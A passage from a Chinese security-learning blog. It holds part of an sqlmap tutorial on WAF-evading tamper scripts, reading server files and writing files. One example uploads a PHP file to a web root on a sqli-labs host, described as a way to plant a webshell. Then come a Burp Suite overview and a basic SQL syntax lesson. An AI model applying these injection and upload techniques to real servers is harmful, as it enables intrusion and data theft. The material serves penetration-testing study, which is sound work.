<p>post数据可以使用–data参数将要提交的数据添加进来就能测试如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">sqlmap.py -u &quot;url&quot; --data=&quot;id=1&amp;admin=2&quot;<br></code></pre></td></tr></table></figure>

<hr>
<p>cookie可以使用–cookie参数来添加参数如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">sqlmap.py -u &quot;url&quot; --cookie &#x27;customer=xxxxxxx&#x27;<br></code></pre></td></tr></table></figure>

<hr>
<p>-g参数会主动爬取google上搜索结果来进行注入，对带有get参数的url进行挨个测试，前提魔法</p>
<hr>
<p>超时延迟-timeout 如超时30秒 -timeout 30</p>
<hr>
<p>注入测试脚本参数-tamper：sqlmap自带一个脚本库，内置的脚本库对payload进行了混淆，可以绕过一些waf在sqlmap的安装目录tamper下，脚本可以自己编写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">sqlmap.py -u &quot;url&quot; -tamper &quot;脚本文件&quot;<br></code></pre></td></tr></table></figure>

<p>tamper文件夹下个脚本功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">space2comment.py用/**/代替空格<br><br>apostrophemask.py用utf8代替引号<br><br>equaltolike.pylike代替等号<br><br>space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）<br><br>greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。<br><br>space2hash.py空格替换为#号,随机字符串以及换行符<br><br>apostrophenullencode.py绕过过滤双引号，替换字符和双引号。<br><br>halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论<br><br>space2morehash.py空格替换为 #号 以及更多随机字符串 换行符<br><br>appendnullbyte.py在有效负荷结束位置加载零字节字符编码<br><br>ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’<br><br>space2mssqlblank.py(mssql)空格替换为其它空符号<br><br>base64encode.py　用base64编码替换<br><br>space2mssqlhash.py　替换空格<br><br>modsecurityversioned.py过滤空格，包含完整的查询版本注释<br><br>space2mysqlblank.py　空格替换其它空白符号(mysql)<br><br>between.py用between替换大于号（&gt;）<br><br>space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）<br><br>multiplespaces.py围绕SQL关键字添加多个空格<br><br>space2plus.py用+替换空格<br><br>bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like<br><br>nonrecursivereplacement.py双重查询语句,取代SQL关键字<br><br>space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集<br><br>sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾<br><br>chardoubleencode.py双url编码(不处理以编码的)<br><br>unionalltounion.py替换UNION ALLSELECT UNION SELECT<br><br>charencode.py　url编码<br><br>randomcase.py随机大小写<br><br>unmagicquotes.py宽字符绕过 GPCaddslashes<br><br>randomcomments.py用/**/分割sql关键字<br><br>charunicodeencode.py字符串 unicode 编码<br><br>securesphere.py追加特制的字符串<br><br>versionedmorekeywords.py注释绕过<br><br>space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’<br><br>halfversionedmorekeywords.py关键字前加注释<br><br></code></pre></td></tr></table></figure>

<hr>
<p>–current-user当前数据库使用账户<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-05-51.png" alt="查看当前账户" class="lazyload"></p>
<hr>
<p>–mobile模拟手机进行测试  –smart智能判断 –passwords -v1对加密的密码尝试进行哈希对撞 –roles可以查看数据管理员的角色<br>–is-dba查看是否是管理员权限</p>
<hr>
<p>–file-read当数据库为mysql、postgresql或sqlserver并且当前用户有权限时可以读取指定文件，可以时文本文件或者二进制文件<br>如我们读取目标服务器c盘test.txt<br>sqlmap -u “url” –file-read “文件路径”</p>
<hr>
<p>–file-write –file-dest上传文件到数据库服务器中<br>当数据库为mysql、postgresql或sqlserver通过powershell，并且当前用户有权限向任意目录写文件时，可以上传文件到数据库服务器，文件可以是文本，也可以是二进制文件，所以利用文件上传一句话木马或者shell<br>前提我们必须知道服务器的绝对路径：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python2 sqlmap.py -u http://xxx/sqli-labs/Less-<span class="hljs-number">2</span>/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <br>--file-write C:\Users\mi\Desktop\<span class="hljs-number">1.</span>php <br>--file-dest <span class="hljs-string">&quot;C:\phpStudy\PHPTutorial\WWW\2.php&quot;</span>  <br><span class="hljs-comment">#将本地的C:\Users\mi\Desktop\1.php文件上传到目标服务器C:\phpStudy\PHPTutorial\WWW\2.php</span><br></code></pre></td></tr></table></figure>

<hr>
<p>–proxy挂代理：</p>
<ol>
<li>直接代理可直接在-u之后直接输入–proxy “代理地址:端口”此时就使用代理访问了</li>
<li>简介代理：利用burp将sqlmap代理写成监听地址那么sqlmap数据就会通过burp发出这样做可以监听sqlmap发出的请求包能防ip被封。</li>
</ol>

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="burpsuite使用方法" class="lazyload">
                    <h1>burpsuite使用方法</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月24日</a>
            <a><i class="nexmoefont icon-areachart"></i>1.6k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
        </div>

        <article>
            
                <h2 id="Burpsuite简介"><a href="#Burpsuite简介" class="headerlink" title="Burpsuite简介"></a>Burpsuite简介</h2><p>Burp Suite简称BP，是用于攻击web应用程序的集成平台，它包含了许多工具，并为这些工具设计了很多接口，以促进加快攻击应用程序的过程。</p>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击简称MITM攻击是一种间接的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为中间人。burpsuite抓包就是用的是这种方式。</p>
<h2 id="burpsuite安装"><a href="#burpsuite安装" class="headerlink" title="burpsuite安装"></a>burpsuite安装</h2><p>到官网下载jar包，由于它是在java环境下运行的所以需要首先本地配置好java运行环境，用java命令启动。安装完成后抓包提示不安全无页面响应则需要安装根证书才能成功抓包。<br>根证书的安装：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-10-58-28.png" alt="安装根证书" class="lazyload"><br>根证书导入完成就可以抓取到数据包了。</p>
<h2 id="burpsuite功能介绍"><a href="#burpsuite功能介绍" class="headerlink" title="burpsuite功能介绍"></a>burpsuite功能介绍</h2><h3 id="Doshboard模块"><a href="#Doshboard模块" class="headerlink" title="Doshboard模块"></a>Doshboard模块</h3><p>这个模块分为三小块：tasks 任务  event log 事件日志 issue activity动态发现的问题<br>task的默认开关：</p>
<ul>
<li>live passive crawl from proxy（all traffic） 被动抓取来自代理流量</li>
<li>live audit from proxy （all traffic）实时审计来自代理流量</li>
</ul>
<p><strong>new scan（主动扫描）</strong><br>主动扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">scan details 选项有两个，一个是爬虫加审计，一个是只有审计，然后填上url即可<br>scan configuration 可以设置自己的ua，或者按照默认配置即可<br>application login options 应用登录选项，只有爬虫检测到登录表单会自动提交 可自定义配置账号<br>resource pool option 并发数配置默认为10<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-51-17.png" alt="主动扫描" class="lazyload"></p>
<p><strong>new live scan （被动扫描）</strong><br>live audit 动态审计<br>live passive crawl 动态被动爬虫<br>tools scope 选择proxy repeater intruder审计那些流量<br>everything 包含所有<br>suite scope 使用burpsuite里加入scope<br>custom scope 自定义选项，可以使用suite scope，可以新增等<br>deduplication 删除重复url，减少重复扫描，默认没有选<br>其他功能和主动扫描一样<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-13-37-58.png" alt="被动扫描" class="lazyload"></p>
<h3 id="target模块"><a href="#target模块" class="headerlink" title="target模块"></a>target模块</h3><p>target是帮助渗透更好地了解目标应用的整体状况、当前工作设计哪些目标域，分析可能存在的攻击面等信息有三个部分site map、scope、issue definitions。</p>
<p><strong>site map 网站地图</strong><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-13-46-53.png" alt="网站地图" class="lazyload"><br>功能模块：<br>include in scope 定义范围内规则<br>exclude from scope 定义排除范文内规则<br>渗透测试过程中，可以通过域名或主机名去限制拦截内容，比如只想拦截login目录下的所有请求，此时的作用域就是目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1 限制站点地图和proxy历史的显示结果<br>2 告诉burp proxy拦截那些请求<br>3 burp spider抓取那些内容<br>4 burp scanner 自动扫描那些作用域的安全漏洞<br>5 在burp intruder和repeater中指定url<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-13-55-47.png" alt="范围" class="lazyload"></p>
<p><strong>issue definitions</strong><br>安全专业的词汇和定义说明。</p>
<h3 id="核心功能-Proxy代理"><a href="#核心功能-Proxy代理" class="headerlink" title="核心功能-Proxy代理"></a>核心功能-Proxy代理</h3><p>数据是一切的基础，proxy代理模块主要用于拦截浏览器的http回话内容，给模块提供数据，proxy模块如下图<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-06-58.png" alt="代理" class="lazyload"><br>代理模块有四个部分intercept、http history、websockets history、options。</p>
<p><strong>intercept</strong><br>这个功能是截断，就是控制整个代理模块是否抓包，用于显示和修改http请求和响应。新版本中增加了专用的浏览器方便使用。低版本则需要手动在浏览器中设置网络代理。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-21-01.png" alt="抓包模块" class="lazyload"><br><strong>http history</strong><br>这里记录了每一个http数据包，可以通过此功能查看历史数据包。也可以过滤数据包，还可以查看数据包的详细信息。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-16-51.png" alt="http history" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-17-47.png" alt="还可以数据包过滤" class="lazyload"><br><strong>websockets history</strong><br>和http history功能十分类似，用于记录websockets，实际很少用。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-18-27.png" alt="websockets" class="lazyload"><br><strong>options</strong><br>这个部分主要用来配置代理：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-25-28.png" alt="配置" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-11-31-01.png" alt="配置" class="lazyload"></p>
<h3 id="intruder模块"><a href="#intruder模块" class="headerlink" title="intruder模块"></a>intruder模块</h3><p>为web应用程序自定义攻击模块，首先将proxy抓取到的数据包发送到intruder中然后根据模块说明自定义修改配置进行攻击。<br>positions 选择攻击模式和攻击范围<br>payloads 有效载荷攻击字典模块配置<br>resource pool 资源池管理情况<br>options intruder攻击配置模块<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-22-42.png" alt="intruder" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-34-46.png" alt="使用" class="lazyload"></p>
<h3 id="repeater模块-–-中继器"><a href="#repeater模块-–-中继器" class="headerlink" title="repeater模块 – 中继器"></a>repeater模块 – 中继器</h3><p>它根据抓到的数据包，修改数据包中的内容重发查看响应的反馈信息。<br>一些词的简单说明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">send 发送数据包<br>cancel 中断发送<br>request 请求包<br>response 响应包<br>raw 接受到的数据包信息包括响应包数据<br>render 反馈数据包的响应包页面不是代码形式<br>hex 十六进制数据消息<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-45-07.png" alt="repeater" class="lazyload"></p>
<h3 id="sequencer模块–定序器"><a href="#sequencer模块–定序器" class="headerlink" title="sequencer模块–定序器"></a>sequencer模块–定序器</h3><p>这个模块是检测数据包质量的工具，主要是为检测数据包代码质量，检测数据是否有被伪造的风险，很少用，不熟悉不要再生产环境下使用。</p>
<h3 id="decoder模块"><a href="#decoder模块" class="headerlink" title="decoder模块"></a>decoder模块</h3><p>这个模块是编码和解码工具有多种编码格式，多重解码加密模式<br>decode 解码<br>encode 加密<br>hash 散列<br>smart decode 智能解码</p>
<p>编码类型：<br>url、html、base64、ascll、16进制、8进制、2进制、GZIP</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-51-50.png" alt="解码" class="lazyload"></p>
<h3 id="comparer模块"><a href="#comparer模块" class="headerlink" title="comparer模块"></a>comparer模块</h3><p>数据对比模块，举例来说，类似登录页面，登录成功和失败的响应包是不同的，因此可以对比寻找差异找突破点。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-53-51.png" alt="对比模块" class="lazyload"><br>words 选项文本数据对比结果<br>bytes 字节16进制对比结果</p>
<h3 id="logger模块"><a href="#logger模块" class="headerlink" title="logger模块"></a>logger模块</h3><p>日志模块，查看日志，方便筛选需要的数据包然后也方便看到数据包的响应包。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-14-56-41.png" alt="日志" class="lazyload"></p>
<h3 id="extender模块"><a href="#extender模块" class="headerlink" title="extender模块"></a>extender模块</h3><p>扩展模块：<br>extender 支持第三方拓展插件功能，主要有四个功能<br>extender 扩展<br>Bappstore 应用程序商店<br>APIS 接口<br>setting 选项</p>
<p><strong>extender</strong><br>允许使用自己的或者第三方代码扩展<br>details 细节 output 输出 error 错误<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-20-42.png" alt="扩展" class="lazyload"></p>
<p><strong>Bapp store</strong><br>插件商店：refresh list 刷新列表 manual install 自定义安装<br>installing 安装<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-22-38.png" alt="插件商店" class="lazyload"></p>
<p><strong>apis</strong><br>通过拓展程序api常见自己的扩展，自定义burpsuite的行为<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-24-10.png" alt="apis" class="lazyload"></p>
<p><strong>setting</strong><br>扩展的相关设置<br>automatically reload extensions on startup 启动时自动重新加载扩展<br>automatically update installed bapp on startup 启动时自动更新已安装的插件<br>java environment java环境 加载jar文件的文件夹<br>python environment python环境 在jiava中实现python解释器<br>    第一个选项 jython独立的jar文件<br>    第二个选项 加载模块<br>ruby environment ruby环境<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-29-39.png" alt="插件环境" class="lazyload"></p>
<h3 id="setting模块"><a href="#setting模块" class="headerlink" title="setting模块"></a>setting模块</h3><p>对burp进行设置的选项具体内容不进行详细解释<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/2023-03-25-15-42-00.png" alt="设置" class="lazyload"></p>

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="SQL学习" class="lazyload">
                    <h1>SQL学习</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月22日</a>
            <a><i class="nexmoefont icon-areachart"></i>5k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 22 分钟</a>
        </div>

        <article>
            
                <h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>SQL是用于访问和处理数据库的标准计算机语言：</p>
<ul>
<li>SQL指结构化查询语言</li>
<li>SQL使我们有能力访问数据库</li>
<li>SQL是一种ANSI的标准计算机语言</li>
</ul>
<p>RDBMS指的是关系型数据库管理系统</p>
<ul>
<li>RDBMS中的数据存储在被称为表(tables)的数据库对象中</li>
<li>表是相关数据项的集合，它由行列组成</li>
</ul>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>数据库操作语言DML和数据库定义语言DDL<br>SQL(结构化查询语言)适用于执行查询的语法，但SQL语言也包含用于更新、插入和删除记录的语法。</p>
<p><strong>数据库操作语言DML</strong><br>查询和更新指令构成了SQL的DML部分：<em>更多的是操作表里的数据</em></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">-</span> 从数据库表中获取数据<br>update <span class="hljs-operator">-</span> 更新数据库表中的数据<br><span class="hljs-keyword">delete</span> <span class="hljs-operator">-</span> 从数据库表中删除数据<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-operator">-</span>向数据库表中插入数据<br></code></pre></td></tr></table></figure>

<p><strong>数据库定义语言DDL</strong><br>SQL的数据定义语言DDL部分使我们有能力创建或者删除表格:<em>更多的是操作数据库及表</em><br>数据库中最重要的DDL语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database <span class="hljs-operator">-</span> 创建新数据库<br><span class="hljs-keyword">alter</span> database <span class="hljs-operator">-</span> 修改数据库<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">-</span> 创建新表<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">-</span> 变更或改变数据库表名<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">-</span> 删除表<br><span class="hljs-keyword">create</span> index <span class="hljs-operator">-</span> 创建索引(搜索键)<br><span class="hljs-keyword">drop</span> index <span class="hljs-operator">-</span> 删除索引<br></code></pre></td></tr></table></figure>

<h2 id="数据库的语句"><a href="#数据库的语句" class="headerlink" title="数据库的语句"></a>数据库的语句</h2><p><strong>select 和 select * 语句</strong><br>select语句用于从表中选取数据，结果被存储在一个结果表中（称结果集）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"># 语法<br><span class="hljs-keyword">select</span> 列名称 <span class="hljs-keyword">from</span> 表名称<br><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名称<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-16-58.png" alt="查询语句" class="lazyload"></p>
<p><strong>select distinct语句</strong><br>在表中可能包含重复值，该语句用于列出不同的distinct的值<br>distinct用于返回<strong>唯一不同</strong>的值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> 列名称 <span class="hljs-keyword">from</span> 表名称<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-45-06.png" alt="distinct语句" class="lazyload"></p>
<p><strong>where子句</strong><br>如需有条件查询表中的数据，可以将where子句添加到select语句中</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> 列名称 <span class="hljs-keyword">from</span> 表名称 <span class="hljs-keyword">where</span> 列 运算符 值<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-18-57.png" alt="where条件" class="lazyload"><br>运算符有：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-07-15.png" alt="where运算符" class="lazyload"><br>在某些版本的sql中&lt;&gt;可以写为!=</p>
<p><strong>and 和 or 运算符</strong><br>and 和 or 运算符用于基于一个以上的条件对记录进行过滤<br>and 和 or 可在where子语句中把两个或多个条件结合起来<br>如果第一个和第二个条件都成了，则and运算符显示一条记录<br>如果第一个和第二个条件中只要有一个成立，则or运算符显示一条记录</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-12-49-20.png" alt="and和or" class="lazyload"></p>
<p><strong>oder by语句</strong><br>order by语句用于根据指定的列对结果集进行排序<br>order by语句默认按照升序对记录进行排序<br>如果希望按照降序排列需要使用desc关键字,升序的关键字是asc</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">#以字母顺序显示名称<br><span class="hljs-keyword">select</span> username,level <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> username<br>#以字母顺序显示名字，并以级别显示顺序<br><span class="hljs-keyword">select</span> username,level <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> level<br>#以字母顺序显示名字，并以级别逆序排列<br><span class="hljs-keyword">select</span> username，level <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> level <span class="hljs-keyword">desc</span><br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-14-40-56.png" alt="order by语句" class="lazyload"></p>
<p><strong>insert into语句</strong><br>insert into语句用于向表格中插入新的行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> 表名称 <span class="hljs-keyword">values</span> (值<span class="hljs-number">1</span>，值<span class="hljs-number">2</span>，...)<br>也可以指定索要插入的数据的列<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> 表名称 (列<span class="hljs-number">1</span>，列<span class="hljs-number">2</span>，...) <span class="hljs-keyword">values</span> (值<span class="hljs-number">1</span>,值<span class="hljs-number">2</span>,...)<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-14-48-03.png" alt="插入信息" class="lazyload"></p>
<p><strong>update语句</strong><br>update语句用于修改表中的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">update 表名称 <span class="hljs-keyword">set</span> 列名称 <span class="hljs-operator">=</span> 新 值 <span class="hljs-keyword">where</span> 列名称 <span class="hljs-operator">=</span> 某 值<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-14-52-10.png" alt="修改更新数据" class="lazyload"></p>
<p><strong>delete语句</strong><br>delete语句用于删除表中的行：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> 表名称 <span class="hljs-keyword">where</span> 列名称 <span class="hljs-operator">=</span> 值<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-17-29.png" alt="删除一行" class="lazyload"></p>
<p>可以在不删除表的情况下删除所有行，这意味着表的结构，属性和索引都是完整的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> 表名称<br>或<br><span class="hljs-keyword">delete</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名称<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-21-28.png" alt="清空表" class="lazyload"></p>
<p><strong>create语句</strong><br>create语句用来创建数据库和库中的表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">#创建表<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> 表名(<br>    属性名<span class="hljs-number">1</span> 类型 <span class="hljs-keyword">primary</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-comment">--primary是主键 not null 是不为空</span><br>    属性名<span class="hljs-number">2</span> 类型 <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;值&#x27;</span>,  <span class="hljs-comment">---default用来指定默认值</span><br>    属性名<span class="hljs-number">3</span> 类型    <span class="hljs-comment">--注意最后一条语句不需要加,号</span><br>)<br><br>#创建数据库<br><span class="hljs-keyword">create</span> database 数据库名称    <span class="hljs-comment">--创建数据库</span><br><span class="hljs-keyword">on</span> <span class="hljs-keyword">primary</span><br>(<br> name        <span class="hljs-comment">--数据库的逻辑名称</span><br> filename    <br> <span class="hljs-comment">--物理存放位置及物理文件名称(Student_info.mdf就是在磁盘上显示的名称)</span><br> size        <span class="hljs-comment">--设置数据文件初始大小</span><br> maxsize        <span class="hljs-comment">--设置最大限制</span><br> filegrowth       <span class="hljs-comment">--设置主数据文件增长幅度</span><br>)<br>log <span class="hljs-keyword">on</span>         <span class="hljs-comment">--定义事务日志文件</span><br>(<br> name         <span class="hljs-comment">--逻辑名称</span><br> filename       <span class="hljs-comment">--物理存放位置及物理文件名称</span><br> size<span class="hljs-operator">=</span>        <span class="hljs-comment">--设置事务日志文件初始大小</span><br> maxsize        <span class="hljs-comment">--设置最大限制为</span><br> filegrowth       <span class="hljs-comment">--设置事务日志增长幅度</span><br>)<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-17-10.png" alt="创建表" class="lazyload"></p>
<p><strong>top子句</strong><br>top子句用于规定要返回的记录数目。对于拥有数千条记录的大型表来说top子句是很有用的。注意并非所有的数据库都支持top子句。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"># <span class="hljs-keyword">SQL</span> Server 的语法<br> <br><span class="hljs-keyword">SELECT</span> TOP number<span class="hljs-operator">|</span><span class="hljs-keyword">percent</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name<br>  <br># MySQL 语法<br> <br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name LIMIT number<br> <br># Oracle 语法<br> <br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> ROWNUM <span class="hljs-operator">&lt;=</span> number<br><br></code></pre></td></tr></table></figure>

<p><strong>limit数据分页</strong><br>limit用于限定返回记录数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">limit n #提取n条数据<br>limit m,n #跳过m条数据，提取n条数据<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-44-05.png" alt="limit限定" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/22/SQL%E5%AD%A6%E4%B9%A0/2023-03-22-15-44-54.png" alt="limit" class="lazyload"></p>
<p><strong>like操作符</strong><br>like操作符用在where子句中搜索列表中的指定模式。</p>
